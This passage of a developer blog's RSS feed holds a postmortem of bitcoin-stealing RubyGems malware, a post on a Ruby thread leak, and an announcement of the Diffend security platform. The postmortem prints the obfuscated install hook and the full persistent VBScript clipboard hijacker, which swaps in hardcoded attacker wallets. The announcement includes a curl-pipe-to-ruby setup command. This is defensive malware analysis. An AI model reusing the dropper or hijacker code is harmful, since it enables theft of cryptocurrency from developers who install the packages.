+<p>On the 7th of December 2020, the <code>ruby-bitcoin</code> package was pinpointed for inspection. On a first  glimpse, it seemed legit:</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53.png" rel="lightbox[5157]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53.png" alt="" width="980" height="477" class="aligncenter size-full wp-image-5161" srcset="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53.png 980w, https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53-300x146.png 300w, https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53-768x374.png 768w, https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-31-14-30-53-766x373.png 766w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
+<p>It had a decent amount of "stars" from Github, and there was a Github repository that "looked" like expected. However, all of it was a hoax. This gem was just a shallow copy of the popular <a href="https://rubygems.org/gems/bitcoin-ruby"><code>bitcoin-ruby</code></a> library.</p>
+<p>Typosquattings of popular gems are no longer allowed on RubyGems, but brandjacking is a an entirely different story. The attacker chose to reverse the <code>-ruby</code> naming and turn it to his advantage. There is no clear convention whether to call things with <code>-ruby</code> postfix or <code>ruby-</code> prefix, and both are allowed and used. There are gems like <code>ruby-kafka</code> as well as <code>bitcoin-ruby</code>. This makes things easier for attackers.</p>
+<p>The code that was uploaded used the "not an exploit but a feature" feature of ruby gems, which is the <a href="https://guides.rubygems.org/gems-with-extensions/#extconfrb"><code>extconf.rb</code></a> gateway into install code execution. While it is not the only way to do malicious things, it is by far the most common approach due to its simplicity and the fact that an accidental install without requiring or execution is more than enough to infect the machine on which the gem was installed.</p>
+<p>The important <code>extconf.rb</code> parts look as followed (removed non-relevant code and re-formatted for better readability):</p>
+<pre class="brush: ruby; title: ; notranslate">
+begin
+  os = RbConfig::CONFIG['host_os']
+
+  if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
+      vbs_out = &quot;RGltIG9ialdTSCxv---...---IA0K&quot;
+      content = Base64.decode64(vbs_out.gsub(&quot;---&quot;, &quot;&quot;))
+      File.open(&quot;the_Score.vbs&quot;, &quot;w&quot;) { |file| file.write(content) }
+      cmd = &quot;d3Nj---cmlwdCB0---aGVfU2NvcmUud---mJz&quot;.gsub(&quot;---&quot;, &quot;&quot;)
+      decoded_cmd = Base64.decode64(cmd)
+      system(decoded_cmd)
+  end
+rescue =&gt; e
+end
+</pre>
+<p>Full codebase available <a href="https://my.diffend.io/gems/ruby-bitcoin/0.0.20#d2h-781865">here</a>.</p>
+<p>Upon this gem installation, in case it was Windows OS, a Visual Basic file has been created and executed. The enigmatic <code>"d3Nj---cmlwdCB0---aGVfU2NvcmUud---mJz".gsub("---", "")</code> when decoded is just a Windows Script Host command: <code>wscript the_Score.vbs</code>.</p>
+<blockquote><p>Windows Script Host provides an environment in which users can execute scripts in a variety of languages that use a variety of object models to perform tasks.</p></blockquote>
+<p>What is more interesting, is the <a href="https://my.diffend.io/gems/ruby-bitcoin/0.0.20#d2h-781865-185">Visual Basic script</a> itself:</p>
+<pre class="brush: vb; title: ; notranslate">
+Dim objWSH,objFSO
+Set objWSH = CreateObject(&quot;WScript.Shell&quot;)
+Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+objFSO.DeleteFile(wscript.ScriptFullName)
+On Error Resume Next
+Dim Fygna, Nfbvm, Sctcr, Zvofm, Fobuo, Rlfad
+Fygna = &quot;bc1qgmem0e4mjejg4lpp03tzlmhfpj580wv5hhkf3p&quot;
+Nfbvm = &quot;467FN8ns2MRYfLVEuyiMUKisvjz7zYaS9PkJVXVCMSwq37NeesHJpkfG44mxEFHu8Nd9VDtcVy4kM9iVD7so87CAH2iteLg&quot;
+Sctcr = &quot;0xcB56f3793cA713813f6f4909D7ad2a6EEe41eF5e&quot;
+Zvofm = objWSH.ExpandEnvironmentStrings(&quot;%PROGRAMDATA%&quot;) &amp; &quot;\Microsoft Essentials&quot;
+Fobuo = Zvofm &amp; &quot;\Software Essentials.vbs&quot;
+Rlfad = &quot;Microsoft Software Essentials&quot;
+If Not objFSO.Folderexists(Zvofm) then
+objFSO.CreateFolder Zvofm
+End If
+Const HKEY_CURRENT_USER = &amp;H80000001
+strComputer = &quot;.&quot;
+Set objRegistry = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\default:StdRegProv&quot;)
+objRegistry.SetStringValue HKEY_CURRENT_USER, &quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;, Rlfad, chr(34) &amp; Fobuo &amp; chr(34)
+Call Lncpp()
+objWSH.run chr(34) &amp; Fobuo &amp; chr(34)
+Set objWSH = Nothing
+Set objFSO = Nothing
+Sub Lncpp
+    Dim Sdrqq
+    Set Sdrqq = objFSO.CreateTextFile(Fobuo, True)
+    Sdrqq.WriteLine &quot;On Error Resume Next&quot;
+    Sdrqq.WriteLine &quot;Set objHTML = CreateObject(&quot; &amp; chr(34) &amp; &quot;HTMLfile&quot; &amp; chr(34) &amp; &quot;)&quot;
+    Sdrqq.WriteLine &quot;Set objWSH = CreateObject(&quot; &amp; chr(34) &amp; &quot;WScript.Shell&quot; &amp; chr(34) &amp; &quot;)&quot;
+    Sdrqq.WriteLine &quot;Do&quot;
+    Sdrqq.WriteLine &quot;wscript.sleep(1000)&quot;
+    Sdrqq.WriteLine &quot;Twwzb = objHTML.ParentWindow.ClipboardData.GetData(&quot; &amp; chr(34) &amp; &quot;text&quot; &amp; chr(34) &amp; &quot;)&quot;
+    Sdrqq.WriteLine &quot;Vsuvu = Len(Twwzb)&quot;	
+    Sdrqq.WriteLine &quot;If Left(Twwzb,1) = &quot; &amp; chr(34) &amp; &quot;1&quot; &amp; chr(34) &amp; &quot; then&quot;
+    Sdrqq.WriteLine &quot;If Vsuvu &gt;= 26 and Vsuvu &lt;= 35 then&quot;
+    Sdrqq.WriteLine &quot;objWSH.run &quot; &amp; chr(34) &amp; &quot;C:\Windows\System32\cmd.exe /c echo &quot; &amp; Fygna &amp; &quot;| clip&quot; &amp; chr(34) &amp; &quot;, 0&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;End If&quot;	
+    Sdrqq.WriteLine &quot;If Left(Twwzb,1) = &quot; &amp; chr(34) &amp; &quot;3&quot; &amp; chr(34) &amp; &quot; then&quot;
+    Sdrqq.WriteLine &quot;If Vsuvu &gt;= 26 and Vsuvu &lt;= 35 then&quot;
+    Sdrqq.WriteLine &quot;objWSH.run &quot; &amp; chr(34) &amp; &quot;C:\Windows\System32\cmd.exe /c echo &quot; &amp; Fygna &amp; &quot;| clip&quot; &amp; chr(34) &amp; &quot;, 0&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;End If&quot;	
+    Sdrqq.WriteLine &quot;If Left(Twwzb,1) = &quot; &amp; chr(34) &amp; &quot;4&quot; &amp; chr(34) &amp; &quot; then&quot;
+    Sdrqq.WriteLine &quot;If Vsuvu &gt;= 95 and Vsuvu &lt;= 106 then&quot;
+    Sdrqq.WriteLine &quot;objWSH.run &quot; &amp; chr(34) &amp; &quot;C:\Windows\System32\cmd.exe /c echo &quot; &amp; Nfbvm &amp; &quot;| clip&quot; &amp; chr(34) &amp; &quot;, 0&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;If Left(Twwzb,1) = &quot; &amp; chr(34) &amp; &quot;p&quot; &amp; chr(34) &amp; &quot; then&quot;
+    Sdrqq.WriteLine &quot;If Vsuvu &gt;= 30 and Vsuvu &lt;= 60 then&quot;
+    Sdrqq.WriteLine &quot;objWSH.run &quot; &amp; chr(34) &amp; &quot;C:\Windows\System32\cmd.exe /c echo &quot; &amp; Nfbvm &amp; &quot;| clip&quot; &amp; chr(34) &amp; &quot;, 0&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;End If&quot;		
+    Sdrqq.WriteLine &quot;If Left(Twwzb,1) = &quot; &amp; chr(34) &amp; &quot;0&quot; &amp; chr(34) &amp; &quot; then&quot;
+    Sdrqq.WriteLine &quot;If Vsuvu &gt;= 30 and Vsuvu &lt;= 60 then&quot;
+    Sdrqq.WriteLine &quot;objWSH.run &quot; &amp; chr(34) &amp; &quot;C:\Windows\System32\cmd.exe /c echo &quot; &amp; Sctcr &amp; &quot;| clip&quot; &amp; chr(34) &amp; &quot;, 0&quot;
+    Sdrqq.WriteLine &quot;End If&quot;
+    Sdrqq.WriteLine &quot;End If&quot;	
+    Sdrqq.WriteLine &quot;Loop&quot;
+    Sdrqq.Close
+	Set Sdrqq = Nothing
+End Sub
+</pre>
+<p>This code registers itself to always run on startup and, when invoked, keeps track of the machine clipboard. Whenever a bitcoin wallet ID would be detected, it would be replaced with the attacker’s one.</p>
+<p>Did it affect anyone? Hard to say with absolute certainty. The gem was uploaded around 10 pm CET on the 7th of December and was available for around 12 hours. During that time, it got 53 downloads. 50-70 downloads for any new gem is a number indicating, no-one used it. Those downloads are usually triggered by mirroring and analytics platforms based on the webhooks fired by RubyGems. In their case, gems are downloaded but not installed.</p>
+<h3>pretty_color postmortem</h3>
+<p>While <code>ruby-bitcoin</code> contained only malicious code, <code>pretty_color</code> actually used a legit codebase from a library called <code>colorize</code> to hide the malicious code.</p>
+<p>The malicious code is pretty much the same as in the previous example, however, the execution flow is different. This time it's not the <code>extconf.rb</code> that triggers the execution but an actual usage attempt:</p>
+<pre class="brush: ruby; title: ; notranslate">
+module TestRuby
+  VERSION = &quot;0.1.0&quot;
+  class TestVersion
+    def self.test
+      begin
+        # same code as with ruby-bitcoin
+      rescue
+        p
+      end
+    end
+  end
+end
+
+TestRuby::TestVersion.test
+</pre>
+<p>I'm certain we can expect more malicious packages that base their names on popular libraries from other package managers.</p>
+<h3>Summary</h3>
+<p>I do not underestimate the risks of this type of attack; however, what worries me more are the OSS supply chain attacks designed to cause havoc in the applications in which they are being used. Either by stealing production data, running botnets, or mining coins.</p>
+<p>Due to the nature of RubyGems, everyone is allowed to upload anything they want. As long as the packages are not harmful, they are permitted to stay. This means, that research packages like <a href="https://my.diffend.io/gems/valis/2300.4.2">this one</a>, despite collecting and sending data, will not be removed. This makes things a bit harder. There is still some noise from packages that have strong indicators of being malicious while actually not causing any harm.</p>
+<p>How to protect yourself against threats like this? That's a question for a different article, but you can start by being strict whenever you add new dependencies and not relying on new packages. You can also use the free <a href="https://diffend.io/">Diffend.io</a> plugin to impose the policies you want to have without any manual interactions.</p>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/quoteinspector/43759112924/in/photolist-29EQTJd-ekD7CS-ekwVXu-fbgmn4-dqRE9e-n9UrF6-2iXgqUA-F2KyCp-ks88w4-a1DE33-ekr8ne-hyiUr5-28xHsEq-28xHrXy-29Vh1AX-2ad5Cx7-28xHswE-hyiErG-2ad5CjG-2benF4Q-2benETE-2ad5DsJ-PaWffy-2ad5C89-28xHrE9-hyjiGw-hyiHWr-hyjqFw-p4KUT8-hyjhPE-hyiN7b-KL8x2A-hykh9P-hyiwqk-hyiHCk-hykqj6-hyjnij-qEVFcv-Q4keqU-PxLUq1-frS34B-2iQU5SE-Q4keEb-PTHtaE-PxLV3y-nbfUBA-o9x51W-q3Dorc-29nV92M-VhpVPj">QuoteInspector.com</a> on Attribution-NoDerivs 2.0 Generic (CC BY-ND 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/">RubyGems Bitcoin Stealing Malware postmortem</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>The hidden cost of a Ruby threads leakage</title>
+		<link>https://mensfeld.pl/2020/12/the-hidden-cost-of-a-ruby-threads-leakage/</link>
+					<comments>https://mensfeld.pl/2020/12/the-hidden-cost-of-a-ruby-threads-leakage/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 26 Dec 2020 15:46:05 +0000</pubDate>
+				<category><![CDATA[Karafka]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[karafka]]></category>
+		<category><![CDATA[karafka framework]]></category>
+		<category><![CDATA[Performance]]></category>
+		<category><![CDATA[Ruby 3]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5097</guid>
+
+					<description><![CDATA[<p>Bug hunting Recently I’ve been working with one small application that would gradually become slower and slower. While there were many reasons for it to happen, I found one of them interesting. To give you a bit of context: the application was a simple single topic legacy Kafka consumer. I rewrote it to Karafka, and [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/12/the-hidden-cost-of-a-ruby-threads-leakage/">The hidden cost of a Ruby threads leakage</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<h3>Bug hunting</h3>
+<p>Recently I’ve been working with one small application that would gradually become slower and slower. While there were many reasons for it to happen, I found one of them interesting.</p>
+<p>To give you a bit of context: the application was a simple single topic legacy Kafka consumer. I rewrote it to Karafka, and all of the logic looks like this:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class EventsConsumer &lt; Karafka::BaseConsumer
+  def initialize(...)
+    super
+    @processor = Processor.new
+  end
+
+  def consume
+    @processor.call(params_batch.payloads)
+  end
+end
+</pre>
+<p>And the processor looks like so (I removed all the irrelevant code):</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Processor
+  def initialize
+    @queue = Queue.new
+    @worker = Thread.new { work }
+  end
+
+  def call(events)
+    # do something with events
+    results = complex_inline_computation(events)
+    @queue &lt;&lt; results
+  end
+
+  private
+
+  def work
+    while true
+      result = @queue.pop
+      # some sort of async storing operation should go here
+      p result
+    end
+  end
+
+  def complex_inline_computation(events)
+    events.join('-')
+  end
+end
+</pre>
+<p>So, we have a Karafka consumer with a processor with one background thread supposed to flush the data async. Nothing special, and when putting aside potential thread crashes, all looks good.</p>
+<p>However, there is a hidden problem in this code that can reveal itself by slowly degrading this consumer performance over time.</p>
+<p>Karafka uses a single persistent consumer instance per topic partition. When we start processing a given partition of a given topic for the first time, a new consumer instance is created. This by itself means that the number of threads we end up with is directly defined by the number of topics and their partitions we're processing with a single Karafka process.</p>
+<p>If that was all, I would say it's not that bad. While for a single topic consuming process, with 20 partitions, we do end up with additional 20 threads, upon reaching this number, the degradation should stop.</p>
+<p>It did not.</p>
+<p>There is one more case where our legacy consumer and Karafka would spin-up additional threads because of the processor re-creation: Kafka rebalance. When rebalancing happens, new consumer instances are initialized. That means that each time scaling occurred, whether it would add or remove instances, a new processor thread would be created.</p>
+<h3>Fixing the issue</h3>
+<p>Fixing this issue without a re-design is rather simple. As long as we can live with a singleton and we know that our code won't be executed by several threads in parallel, we can just make the processor into a singleton:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Processor
+  include Singleton
+  
+  # Remaining code
+end
+
+class EventsConsumer &lt; Karafka::BaseConsumer
+  def initialize(...)
+    super
+    @processor = Processor.instance
+  end
+
+  # Remaining code
+end
+
+</pre>
+<p>While it is not the optimal solution, in my case it was sufficient.</p>
+<h3>Performance impact</h3>
+<p>One question remains: what was the performance impact of having stale threads that were doing nothing?</p>
+<p>I'll try to answer that with a more straightforward case than mine: </p>
+<pre class="brush: ruby; title: ; notranslate">
+require 'benchmark'
+
+MAX_THREADS = 100
+STEP = 10
+ITERS = 50000000
+
+(0..MAX_THREADS).step(STEP).each do |el|
+  STEP.times do
+    Thread.new do
+      q = Queue.new
+      q.pop
+    end
+  end unless el.zero?
+
+  # Give it a bit of time to initialize the threads
+  sleep 5
+
+  # warmup for jruby - thanks Charles!
+  5.times do
+    ITERS.times do ; a = &quot;1&quot;; end
+  end
+
+  Benchmark.bm do |x|
+    x.report { ITERS.times do ; a = &quot;1&quot;; end }
+  end
+end
+</pre>
+<p>I've run this code 100 times and used the average time to minimize the randomness impact of other tasks running on this machine.</p>
+<p>Here are the results for Ruby 2.7.2, 3.0.0-preview2 (with and without JIT) and JRuby 9.2.13, all limited with <code>time taskset -c 1</code>, to make sure that JRuby is running under the same conditions (single core):</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-25-00.png" rel="lightbox[5097]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-25-00.png" alt="" width="589" height="362" class="aligncenter size-full wp-image-5147" srcset="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-25-00.png 589w, https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-25-00-300x184.png 300w" sizes="(max-width: 589px) 100vw, 589px" /></a></p>
+<p>CRuby performance degradation is more or less linear. The more threads you have that do nothing, the slower the overall processing happens. This does not affect JRuby as JVM threads support is entirely different than the CRubys.</p>
+<p>What worries me more, though, is that Ruby 3.0 seems to degrade more than 2.7.2. My wild guess here is that it's because of Ractors code's overhead and other changes that impact threads scheduler.</p>
+<p>Below you can find the time comparison for all the variants of CRuby:</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-34-34.png" rel="lightbox[5097]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-34-34.png" alt="" width="585" height="357" class="aligncenter size-full wp-image-5151" srcset="https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-34-34.png 585w, https://mensfeld.pl/wp-content/uploads/2020/12/Zrzut-ekranu-z-2020-12-26-16-34-34-300x183.png 300w" sizes="(max-width: 585px) 100vw, 585px" /></a></p>
+<p>It is fascinating that 3.0 is slower than 2.7.2 in this case, and I will try to look into the reasons behind it in the upcoming months.</p>
+<p>Note: I do not believe it's the best use-case for JIT, so please do not make strong claims about its performance based on the charts above.</p>
+<h3>Summary</h3>
+<p>The more complex applications you build, the bigger chances are that you will have to have threads at some point. If that happens, please be mindful of their impact on your applications' overall performance.</p>
+<p>Also, keep in mind that the moment you introduce background threads, the moment you should introduce proper instrumentation around them.</p>
+<hr>
+<p>Cover photo by <a href="https://www.flickr.com/photos/chadcooperphotos/9083640031/in/photolist-eQG2Hi-6CLZhL-qnQFRF-qTiQuT-7Ebz7K-qTkJ4R-9obHqW-6fkLNb-4it1tf-9qExkL-4DZAPv-coWHmE-7FAdDG-cHZvzE-2omhP-5E4zXf-jqzHTk-278ycTf-sYr6L-LDePf-2omhp-2omhz-68oZ7A-2gu5BzZ-4oTi3u-BnCYKb-BqFAr6-bbAsNx-SSYxs2-CMbhC-CMbjC-4y7h4i-4Gn6Lv-wvWCPd-5Cv4WD-CMbiV-bWsWUX-CMbmL-5eg3np-CMbp6-CMbns-XZK9Cz-CMboh-CMbqh-oNffKQ-Y9cfFP-XcapFs-XcapV5-5PCk8V-SFsYRV">Chad Cooper</a> on Attribution 2.0 Generic (CC BY 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/12/the-hidden-cost-of-a-ruby-threads-leakage/">The hidden cost of a Ruby threads leakage</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2020/12/the-hidden-cost-of-a-ruby-threads-leakage/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Diffend – OSS supply chain security and management platform for Ruby</title>
+		<link>https://mensfeld.pl/2020/10/diffend-ruby-security/</link>
+					<comments>https://mensfeld.pl/2020/10/diffend-ruby-security/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Tue, 13 Oct 2020 12:40:45 +0000</pubDate>
+				<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[diffend]]></category>
+		<category><![CDATA[security]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5059</guid>
+
+					<description><![CDATA[<p>I’m incredibly excited to announce a security platform for managing Ruby gems dependencies: diffend.io. This platform is a result of my involvement in Ruby security matters for years. It all started in early 2018 with a tool to review gems versions diffs. While working on it, I've noticed that there's much more that needs to [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/10/diffend-ruby-security/">Diffend &#8211; OSS supply chain security and management platform for Ruby</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I’m incredibly excited to announce a security platform for managing Ruby gems dependencies: <a href="https://diffend.io/">diffend.io</a>.</p>
+<p>This platform is a result of my involvement in Ruby security matters for years. It all started in early 2018 with a tool to review gems versions diffs. While working on it, I've noticed that there's much more that needs to be handled. Versions diffing while inevitable, by itself is insufficient, that's why we've built this platform.</p>
+<h3>Getting started</h3>
+<p>If you're just interested in the gems diffing, go to <a href="http://my.diffend.io">my.diffend.io</a> and select any gem and versions you want to view. New releases for all the gems are computed in real-time, but for some of the older ones, you will have to wait a bit.</p>
+<p>You can also use a shiny new link available on each RubyGems gems page to review changes against the previous release of the same gem:</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/10/review-changes.png" rel="lightbox[5059]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/10/review-changes.png" alt="" width="952" height="333" class="aligncenter size-full wp-image-5091" srcset="https://mensfeld.pl/wp-content/uploads/2020/10/review-changes.png 952w, https://mensfeld.pl/wp-content/uploads/2020/10/review-changes-300x105.png 300w, https://mensfeld.pl/wp-content/uploads/2020/10/review-changes-768x269.png 768w, https://mensfeld.pl/wp-content/uploads/2020/10/review-changes-766x268.png 766w" sizes="(max-width: 952px) 100vw, 952px" /></a></p>
+<p>If you would want to run a more thoughtful assessment, you can either run this script in your application main directory:</p>
+<pre class="brush: bash; title: ; notranslate">
+ruby &lt;(curl -s https://my.diffend.io/api/setup/ruby)
+</pre>
+<p>or if you are like me and do not want to run scripts from the internet, you can just follow the super short manual with setup instructions <a href="https://diffend.io/docs#setup-ui">here</a>.</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43.png" rel="lightbox[5059]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43-1024x750.png" alt="" width="766" height="561" class="aligncenter size-large wp-image-5076" srcset="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43-1024x750.png 1024w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43-300x220.png 300w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43-768x563.png 768w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43-766x561.png 766w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-51-43.png 1111w" sizes="(max-width: 766px) 100vw, 766px" /></a></p>
+<p>If something is not clear or you have any questions, please contact us at our Slack workspace with this <a href="https://join.slack.com/t/diffend/shared_invite/zt-gjawv7z5-gaqxc7qmdhDl2ZN9_4ENLQ">invitation link</a> or drop us a line at <a href="mailto:contact@diffend.io">contact@diffend.io</a>.</p>
+<h3>What does it do?</h3>
+<p>In short, Diffend allows you to:</p>
+<ol>
+<li>Review changes in between gems releases before you upgrade based on the gems content itself,</li>
+<li>Block attempts of even downloading potentially unwanted gems and their versions,</li>
+<li>Manage third party dependencies within your organization,</li>
+<li>Ensure OSS licensing consistency in your organization,</li>
+<li>Get insights on vulnerabilities, memory leaks and licensing problems of your dependencies,</li>
+<li>Make dependency audits a part of your workflow,</li>
+<li>Get real-time notifications about any new risks that occur in your production systems (coming soon)</li>
+</ol>
+<p>It also runs certain types of heuristics and checks to pinpoint potentially "interesting" releases for further semi-manual inspection.</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59.png" rel="lightbox[5059]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59-1024x768.png" alt="" width="766" height="575" class="aligncenter size-large wp-image-5074" srcset="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59-1024x768.png 1024w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59-300x225.png 300w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59-768x576.png 768w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59-766x575.png 766w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-16-48-59.png 1120w" sizes="(max-width: 766px) 100vw, 766px" /></a></p>
+<h3>Why do we need it?</h3>
+<p>OSS supply chain attacks are becoming a more and more common thing. Looking at RubyGems or npm, there are plenty of examples of packages getting hijacked and malicious versions being uploaded. There were already several attacks that were detected and stopped thanks to Diffend and RubyGems close cooperation.</p>
+<p>If you just update dependencies without checking them, you’re not actually sure of what you’re putting into production. You should not trust what’s on Github. An attacker can upload something to a registry without pushing it to Github. The only way to be sure is to look at what’s actually on the registry.</p>
+<p>When it’s easy to work securely, people are more likely to do it. <a href="http://diffend.io">diffend.io</a>, is another step towards improving Ruby’s security story by letting you generate diffs from any browser and share them as links. This also lends itself to automation: now you can connect Diffend with your Gemfile and make dependency audits a part of your workflow. We hope this will inspire the community with lots of new security ideas that don’t slow you down.</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59.png" rel="lightbox[5059]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59-1024x578.png" alt="" width="766" height="432" class="aligncenter size-large wp-image-5081" srcset="https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59-1024x578.png 1024w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59-300x169.png 300w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59-768x433.png 768w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59-766x432.png 766w, https://mensfeld.pl/wp-content/uploads/2020/10/Zrzut-ekranu-z-2020-10-12-17-03-59.png 1125w" sizes="(max-width: 766px) 100vw, 766px" /></a></p>
+<h3>Is it secure?</h3>
+<p>Diffend was built with security in mind. Platform, plugin, and our gem collect the absolute minimum amount of data to provide you with the services. Both the Bundler <a href="https://rubygems.org/gems/diffend">plugin</a> and the <a href="https://rubygems.org/gems/diffend">monitor</a> will be open-sourced, but even now you can download and review their content.</p>
+<p>On top of all of that, we've been super cautious about what we collect, that's why:</p>
+<ol>
+<li>We do not collect credentials or environment variables;</li>
+<li>We do not execute any remote code from our plugin or gem. Never.</li>
+<li>We do not access anything except the Gemfile and Gemfile.lock content.</li>
+<li>We do not send to ourselves private access keys for any non-public gems.</li>
+<li>We are working on a fully anonymous mode where we do not track public IPs</li>
+</ol>
+<h3>Support us!</h3>
+<p>Diffend platform is free to use. You don't even need an account to review the diffs (and you never will). If you like our platform, please consider convincing your company to support us with any amount of money. We'll just invoice you for the service usage :)</p>
+<p>This way, with a bit of funding, we might be able to push forward many security initiatives much faster.</p>
+<h3>What’s next?</h3>
+<p>At the moment we are working on several things:</p>
+<ul>
+<li>Open-sourcing the plugin and the monitor,</li>
+<li>Real-time production / staging based context aware Slack and e-mail notifications about new risks,</li>
+<li>Improved heuristics and detection capabilities,</li>
+<li>Modified Ruby VM for network tracking analysis with pre-execution permissions,</li>
+<li>Ruby process behaviour tracking,</li>
+<li>Open-sourcing several of the components for self-service,</li>
+<li>Fully anonymous mode without collecting any public data.</li>
+</ul>
+<p>Diffend is a platform in an alpha stage and under massive development. Some functionalities may not work on every operating system, and some other features may not be available or may be broken. We are working hard to fix and improve the platform, which is why we are counting on your feedback so that we can meet your exact needs faster! </p>
+<h3>Read more</h3>
+<ul>
+<li>Diffend.io <a href="http://diffend.io/docs">documentation</a></li>
+<li><a href="http://my.diffend.io/">The platform</a></li>
+<li>How to take over a Ruby gem <a href="https://www.youtube.com/watch?v=wePVhZeZTNM&feature=emb_title">presentation</a></li>
+<li>Diff Hex <a href="https://hex.pm/blog/announcing-hex-diff">announcement</a> inspired by the Diffend</li>
+</ul>
